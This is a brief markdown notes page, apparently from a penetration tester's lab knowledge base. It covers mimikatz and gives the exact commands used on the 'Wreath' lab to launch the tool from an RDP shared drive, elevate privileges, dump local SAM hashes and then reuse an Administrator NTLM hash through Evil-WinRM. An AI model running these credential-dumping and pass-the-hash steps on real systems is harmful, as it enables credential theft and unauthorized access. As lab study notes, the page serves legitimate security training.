# mimikatz

Windows credential extraction tool used after administrator-level access to dump local hashes, tickets, and secrets.

## Commands Used

### Launch from an RDP shared drive

<!-- cmd: windows -->
```cmd
\\tsclient\share\mimikatz\x64\mimikatz.exe
```

Used on: **Wreath**

launched from a shared RDP drive to avoid a separate upload step.

### Enable debug, elevate token, and dump SAM

<!-- cmd: windows -->
```cmd
privilege::debug
token::elevate
log c:\windows\temp\mimikatz.log
lsadump::sam
```

Used on: **Wreath**

dumped local SAM hashes for Administrator and Thomas, then reused the Administrator NTLM hash with Evil-WinRM.

## Related

- [evil-winrm](evil-winrm.md)
- [xfreerdp](xfreerdp.md)
- [mimikatz-sam-pth.md](../../techniques/creds/mimikatz-sam-pth.md)


